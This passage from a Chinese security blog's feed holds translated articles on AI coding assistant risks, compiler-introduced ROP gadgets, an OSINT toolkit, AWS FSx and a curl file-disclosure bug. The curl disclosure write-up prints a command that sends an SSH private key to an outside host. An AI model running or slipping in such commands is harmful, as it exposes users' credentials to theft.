研究证实（包括本文案例），这些工具会生成存在安全缺陷的代码。必须引入额外检测流程确保漏洞代码不会进入生产环境。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;一致性与可靠性问题&lt;/strong&gt;&lt;br&gt;
工具的输出质量受历史代码质量影响。即使模型本身具备安全输出能力，低质量的上下文代码仍会导致漏洞输出。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数据泄露风险&lt;/strong&gt;&lt;br&gt;
GitHub Copilot等SaaS服务会收集IDE中的按键记录，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原始代码&lt;/li&gt;
&lt;li&gt;注释内容&lt;/li&gt;
&lt;li&gt;项目元数据&lt;br&gt;
这些数据可能被第三方存储分析，如图所示：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;扩展建议&#34;&gt;扩展建议
&lt;/h3&gt;&lt;p&gt;本文仅列举部分风险，更详细的分析和缓解策略请下载完整版白皮书《Addressing Risks from AI Coding Assistants》。尽管研究主要针对GitHub Copilot和ChatGPT，但所述风险具有普适性，适用于各类AI编程辅助工具。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别警示：未来将有更多面向开发者的AI编程工具涌现，安全团队需要建立系统化的应对机制。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>二进制安全优化实践：消除编译器引入的代码重用攻击隐患</title>
        <link>http://localhost:1313/p/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%BC%98%E5%8C%96%E5%AE%9E%E8%B7%B5%E6%B6%88%E9%99%A4%E7%BC%96%E8%AF%91%E5%99%A8%E5%BC%95%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB%E9%9A%90%E6%82%A3/</link>
        <pubDate>Sun, 03 Aug 2025 05:53:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%BC%98%E5%8C%96%E5%AE%9E%E8%B7%B5%E6%B6%88%E9%99%A4%E7%BC%96%E8%AF%91%E5%99%A8%E5%BC%95%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB%E9%9A%90%E6%82%A3/</guid>
        <description>&lt;h1 id=&#34;二进制安全优化实践&#34;&gt;二进制安全优化实践
&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;这样存在毫无意义，安全地存在才有价值&amp;rdquo;（《麦克白》3.1）&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;编译器不仅要生成高效代码，还必须生成安全代码。尽管编译器开发过程中经过严格测试和正确性认证，但其优化过程可能意外引入信息泄漏或删除程序员编写的安全关键操作。图1展示了CWE-733漏洞实例：编译器通过&amp;quot;死存储消除&amp;quot;优化移除了加密密钥清零操作，导致密钥可能被攻击者恢复。&lt;/p&gt;
&lt;h2 id=&#34;代码重用攻击的构建原理&#34;&gt;代码重用攻击的构建原理
&lt;/h2&gt;&lt;p&gt;攻击者使用返回导向编程（ROP）和跳转导向编程（JOP）等技术绕过恶意代码注入防御。这些技术通过复用目标程序中的代码片段（gadgets）构建攻击载荷。每个gadget包含有效计算指令和终止分支指令（如ret/jmp），攻击者通过链式调用gadgets编写漏洞利用程序。图2展示了一个简单的ROP攻击链：&lt;/p&gt;
&lt;h2 id=&#34;研究发现总结&#34;&gt;研究发现总结
&lt;/h2&gt;&lt;p&gt;通过分析GCC/clang编译的20个程序的1000多个变体，我们发现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;85%的优化案例增加了gadget集合规模、效用或可组合性&lt;/li&gt;
&lt;li&gt;主要根源来自两种行为：间接分支指令复制和代码布局变更&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;间接分支指令复制&#34;&gt;间接分支指令复制
&lt;/h3&gt;&lt;p&gt;GCC的帧指针省略优化会复制返回指令（retn），如图3所示。虽然减少了代码大小和执行时间，但会引入更多可能被利用的gadgets。&lt;/p&gt;
&lt;h3 id=&#34;二进制布局变更&#34;&gt;二进制布局变更
&lt;/h3&gt;&lt;p&gt;优化导致的控制流指令位移变化可能意外编码间接分支指令（如0xC3对应retn）。如图4所示，x86_64的非对齐变长指令特性使得这些位移可能被解码为有效gadgets。&lt;/p&gt;
&lt;h2 id=&#34;解决方案二进制安全优化&#34;&gt;解决方案：二进制安全优化
&lt;/h2&gt;&lt;p&gt;我们在Egalito二进制重编译器中实现了五种优化方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;返回指令合并：合并函数内所有返回指令到单个实例&lt;/li&gt;
&lt;li&gt;间接跳转合并：合并同目标寄存器的间接跳转&lt;/li&gt;
&lt;li&gt;指令屏障扩展：消除跨预期指令的特殊用途gadgets&lt;/li&gt;
&lt;li&gt;位移填充：消除跳转位移中的gadgets&lt;/li&gt;
&lt;li&gt;函数重排序：消除调用偏移中的gadgets&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实际效果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;平均消除31.8%有用gadgets&lt;/li&gt;
&lt;li&gt;78%变体中降低gadget集合整体效用&lt;/li&gt;
&lt;li&gt;75%变体中消除至少一类特殊用途gadgets&lt;/li&gt;
&lt;li&gt;零性能影响，平均仅增加6.1kB代码大小&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;编译器行为显著影响二进制gadget集合，但当前设计缺乏对潜在安全属性的关注。通过二进制重编译技术可以在不牺牲性能的前提下消除这些安全隐患。未来将研究寄存器分配等更多问题，并探索其对控制流完整性（CFI）等防御机制的辅助优化效果。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>OSINT利器Buscador：开源情报收集的瑞士军刀</title>
        <link>http://localhost:1313/p/osint%E5%88%A9%E5%99%A8buscador%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</link>
        <pubDate>Sun, 03 Aug 2025 05:42:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/osint%E5%88%A9%E5%99%A8buscador%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</guid>
        <description>&lt;h1 id=&#34;toolsmith-130---使用buscador进行osint调查&#34;&gt;toolsmith #130 - 使用Buscador进行OSINT调查
&lt;/h1&gt;&lt;p&gt;首先，新年快乐！希望您拥有高效成功的2018年。作为开年之作，我将再次探讨开源情报(OSINT)技术。除微软信息安全主管的本职工作外，我还荣幸担任华盛顿国民警卫队J-2情报部门成员，结合J-6网络作战职能，OSINT在识别对手指标和红队评估目标方面具有重要价值。&lt;/p&gt;
&lt;p&gt;Buscador是由OSINT专家Michael Bazzell和David Wescott开发的Linux虚拟机预配置平台，集成了我们曾讨论过的Recon-ng、Spiderfoot等工具。1.1版本包含以下核心工具集：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;地理定位工具&lt;/strong&gt;：Creepy（支持Twitter/Flickr等插件）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;元数据分析&lt;/strong&gt;：Metagoofil/ExifTool/pyExifToolGui&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;域名枚举&lt;/strong&gt;：Knock/SubBrute&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;社交媒体挖掘&lt;/strong&gt;：Tinfoleak/Instalooter&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网页镜像&lt;/strong&gt;：HTTrack/Wayback Exporter&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实战测试&#34;&gt;实战测试
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Creepy定位分析&lt;/strong&gt;&lt;br&gt;
配置Twitter插件搜索&amp;quot;holisticinfosec&amp;quot;，虽未获取精确坐标，但成功关联西雅图地区信息（图1-2）。对于开启地理标记的目标，该工具可绘制活动热力图。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Tinfoleak深度报告&lt;/strong&gt;&lt;br&gt;
生成包含时间线、设备类型、话题标签的完整Twitter活动分析报告（图3），比原生API提供更丰富的元数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Metagoofil文档情报&lt;/strong&gt;&lt;br&gt;
对目标域扫描50份公开文档，输出作者/公司/修改记录等元数据（图6），堪称红队侦察必备工具，其效率超越传统Foca工具。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术亮点&#34;&gt;技术亮点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;虚拟化支持&lt;/strong&gt;：提供OVA镜像和ISO两种部署方式，通过QEMU转换后可在Hyper-V快速部署&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工作流集成&lt;/strong&gt;：所有工具通过左侧菜单栏统一调用，支持Instalooter采集图片→ExifTool解析→BleachBit清理的完整链条&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;即将更新&lt;/strong&gt;：1.2版本将重构Firefox适配并新增特性，开发者透露正在筹备新作&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;重要提示：虽然OSINT工具威力强大，但务必遵守道德准则。公开文档中的元数据可能暴露敏感信息，建议发布前进行清理。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;该平台将分散的OSINT工具整合为标准化工作环境，极大提升了网络侦察效率。对于需要持续进行威胁情报分析的专业人员，Buscador堪称&amp;quot;一站式解决方案&amp;quot;。期待1.2版本带来更多创新功能。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Amazon FSx for OpenZFS现支持直接访问Amazon S3数据（无需迁移）</title>
        <link>http://localhost:1313/p/amazon-fsx-for-openzfs%E7%8E%B0%E6%94%AF%E6%8C%81%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEamazon-s3%E6%95%B0%E6%8D%AE%E6%97%A0%E9%9C%80%E8%BF%81%E7%A7%BB/</link>
        <pubDate>Sun, 03 Aug 2025 05:26:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/amazon-fsx-for-openzfs%E7%8E%B0%E6%94%AF%E6%8C%81%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEamazon-s3%E6%95%B0%E6%8D%AE%E6%97%A0%E9%9C%80%E8%BF%81%E7%A7%BB/</guid>
        <description>&lt;h2 id=&#34;技术架构突破&#34;&gt;技术架构突破
&lt;/h2&gt;&lt;p&gt;即日起，您可将Amazon S3访问点挂载至Amazon FSx for OpenZFS文件系统，使存储在文件系统中的数据能够通过Amazon S3标准API（如GetObject/PutObject/ListObjectsV2）进行访问。该功能具有以下核心特性：&lt;/p&gt;
&lt;h3 id=&#34;统一数据访问层&#34;&gt;统一数据访问层
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;双协议支持&lt;/strong&gt;：数据持续驻留FSx文件系统，同时支持NFS协议与S3 API并行访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限控制&lt;/strong&gt;：每个S3访问点可配置独立IAM策略，支持VPC网络隔离和Block Public Access&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无拷贝操作&lt;/strong&gt;：消除传统ETL流程，直接对接S3生态的AI/ML服务（如Amazon Bedrock/SageMaker）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;实现机制&#34;&gt;实现机制
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;访问点配置&lt;/strong&gt;：通过FSx控制台/AWS CLI创建S3访问点，系统自动生成桶别名（替代传统S3桶名）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务集成&lt;/strong&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 示例：通过S3 API读取FSx数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;boto3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boto3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;s3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Bucket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fsx-access-point-alias&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;report.pdf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性能表现&lt;/strong&gt;：首字节延迟保持在毫秒级，吞吐量取决于FSx文件系统的预配置容量&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;典型应用场景&#34;&gt;典型应用场景
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;RAG工作流&lt;/strong&gt;：将FSx中的PDF文档直接作为Amazon Bedrock知识库源&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据分析&lt;/strong&gt;：通过Athena/Glue查询文件系统数据，无需转换为S3存储格式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Spark处理&lt;/strong&gt;：开源框架可直接使用S3 API访问FSx数据集&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术参数&#34;&gt;技术参数
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;特性&lt;/th&gt;
          &lt;th&gt;指标&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;访问点数量&lt;/td&gt;
          &lt;td&gt;单个文件系统支持数百个访问点&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;延迟水平&lt;/td&gt;
          &lt;td&gt;与原生S3访问性能一致（毫秒级）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;区域支持&lt;/td&gt;
          &lt;td&gt;覆盖北美/欧洲/亚太8个区域&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：该功能会产生额外的S3请求计费，但免除数据迁移产生的传输费用。详细定价参见&lt;a class=&#34;link&#34; href=&#34;https://aws.amazon.com/fsx/openzfs/pricing/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;FSx for OpenZFS定价页&lt;/a&gt;。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞</title>
        <link>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sun, 03 Aug 2025 05:15:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;img src="https://portswigger.net/cms/9a8b6e0b1d8b5b5a/cover-image/research.jpg" alt="Featured image of post curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞" /&gt;&lt;p&gt;在这篇文章中，我们将探讨curl中一个鲜为人知的特性，该特性导致了Burp Suite Pro和Google Chrome的本地文件泄露漏洞。虽然我们早已为Burp Suite发布了补丁，但怀疑该技术可能对利用其他具有&amp;quot;复制为curl命令&amp;quot;功能或从命令行调用curl的应用程序有所帮助。该漏洞由Paul Mutton通过我们的漏洞赏金计划私下报告，并慷慨地允许我们发布这篇分析报告。&lt;/p&gt;
&lt;p&gt;Burp Suite用户经常构造复杂的HTTP请求来演示网站漏洞。为了更轻松地与他人共享这些概念验证漏洞利用，我们提供了&amp;quot;复制为curl命令&amp;quot;功能，可生成复制Burp Suite中请求的curl命令。&lt;/p&gt;
&lt;p&gt;例如，给定以下请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: portswigger.net
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;foo=bar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;点击&amp;quot;复制为curl命令&amp;quot;后，Burp Suite会生成以下命令并复制到剪贴板：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -X $&amp;#39;POST&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Host: portswigger.net&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Length: 7&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     --data-binary $&amp;#39;foo=bar&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     $&amp;#39;https://portswigger.net/&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;您可以将此命令粘贴到终端中，在Burp Suite外部重新发出请求。我们非常注意转义这些数据，以避免用户因恶意请求注入额外的shell命令或任意curl参数而受到攻击。但不幸的是，存在一个更微妙的问题。您能发现吗？&lt;/p&gt;
&lt;p&gt;答案一如既往地藏在友好的手册中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--data-binary &amp;lt;data&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这将完全按指定方式发送数据，不进行任何额外处理。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;如果数据以字母@开头，其余部分应为文件名。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因此，以下命令是安全的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，28字节(0x1c)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0000: /home/albinowax/.ssh/id_rsa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;而这个就不那么安全了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;@/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，662字节(0x296)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; -----BEGIN RSA PRIVATE KEY-----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.b3BlbnNzaC1rZXktdjEA....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(不是我的真实私钥)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们在2020.5.1版本中修复了这个漏洞，如果请求体以@符号开头，就改用更新、更安全但支持较少的&amp;ndash;data-raw标志。&lt;/p&gt;
&lt;p&gt;我们很幸运，因为在Burp Suite中利用此漏洞需要相对较多的用户交互——攻击者需要诱导用户访问恶意网站，将精心设计的请求复制为curl命令，然后通过命令行执行。如果网站使用curl并带有攻击者控制的请求体，则可能产生更大的影响，因此在SSRF测试期间绝对值得关注。@文件读取行为也适用于标头，因此在允许定义自定义标头的网站上可能有用。&lt;/p&gt;
&lt;p&gt;尽管这个特性让我们(和Chrome)感到意外，但它已完全记录在案，因此我们不认为这是curl本身的漏洞。这让我想起了服务器端模板注入，在那里沙箱逃逸可能就像阅读一个被其他人忽视的手册页面一样简单。&lt;/p&gt;
